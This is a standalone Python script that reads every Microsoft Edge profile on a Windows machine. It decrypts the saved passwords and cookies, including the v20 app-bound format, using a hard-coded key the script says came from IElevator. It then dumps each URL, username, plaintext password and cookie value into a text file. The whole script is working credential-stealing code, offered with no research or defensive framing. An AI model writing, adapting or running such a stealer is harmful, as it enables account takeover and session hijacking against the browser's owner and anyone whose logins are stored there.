import json, base64, os, sqlite3, shutil, tempfile, traceback
from Crypto.Cipher import AES

OUT = r"C:\Tools\final_dump.txt"
KEY = bytes.fromhex("3F4131F9EFA62196FB31BE65C6DFD0EDF0069592F7DE919DAA823A92808E8FD0")
EDGE = r"C:\Users\admin\AppData\Local\Microsoft\Edge\User Data"

def log(msg):
    with open(OUT, "a", encoding="utf-8", errors="replace") as f:
        f.write(msg + "\n")

def decrypt_pw(blob, key):
    if not blob or len(blob) < 31:
        return None
    ver = blob[:3]
    if ver in (b"v10", b"v11"):
        return AES.new(key, AES.MODE_GCM, nonce=blob[3:15]).decrypt_and_verify(blob[15:-16], blob[-16:]).decode("utf-8", errors="replace")
    if ver == b"v20":
        p = blob[3:]
        return AES.new(key, AES.MODE_GCM, nonce=p[:12]).decrypt_and_verify(p[12:-16], p[-16:]).decode("utf-8", errors="replace")
    return None

def main():
    open(OUT, "w").close()
    log("=== EDGE v20 DUMP (key from IElevator) ===")

    # list profiles
    profiles = ["Default"] + [d for d in os.listdir(EDGE) if d.startswith("Profile ")]

    for prof in profiles:
        pdir = os.path.join(EDGE, prof)
        ld = os.path.join(pdir, "Login Data")
        if not os.path.exists(ld):
            continue
        tmp = os.path.join(tempfile.gettempdir(), "ld_copy")
        try:
            shutil.copy2(ld, tmp)
        except Exception as e:
            log("[%s] copy fail: %s" % (prof, e))
            continue
        conn = sqlite3.connect(tmp)
        c = conn.cursor()
        try:
            c.execute("SELECT origin_url, username_value, password_value, date_created FROM logins ORDER BY date_created DESC")
        except Exception as e:
            log("[%s] query fail: %s" % (prof, e)); conn.close(); continue
        log("\n===== PROFILE %s PASSWORDS =====" % prof)
        n = 0
        for url, user, pw_blob, dt in c.fetchall():
            pw = None
            if pw_blob:
                try:
                    pw = decrypt_pw(pw_blob, KEY)
                except Exception as e:
                    pw = "<err %s>" % e
                if pw and not pw.startswith("<err"):
                    n += 1
            log("%s | %s | %s" % (url or "?", user or "?", pw))
        log("[profile %s: %d cracked]" % (prof, n))
        conn.close()
        os.remove(tmp)

    # cookies from every profile
    for prof in profiles:
        pdir = os.path.join(EDGE, prof)
        ck = os.path.join(pdir, "Network", "Cookies")
        if not os.path.exists(ck):
            continue
        tmp = os.path.join(tempfile.gettempdir(), "ck_copy")
        try:
            shutil.copy2(ck, tmp)
        except Exception as e:
            log("[%s] cookie copy fail: %s" % (prof, e)); continue
        conn = sqlite3.connect(tmp)
        c = conn.cursor()
        c.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), expires_utc FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 30")
        log("\n===== PROFILE %s COOKIES =====" % prof)
        ok = 0; fail = 0
        for h, nme, enc, exp in c.fetchall():
            try:
                v = decrypt_pw(enc, KEY)
                if v:
                    ok += 1
                    log("%s | %s | %s | exp=%s" % (h, nme, v[:120], exp))
                else:
                    fail += 1
            except Exception:
                fail += 1
        log("[profile %s cookies: %d ok, %d fail]" % (prof, ok, fail))
        conn.close()
        os.remove(tmp)

    log("\nDONE")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log(traceback.format_exc())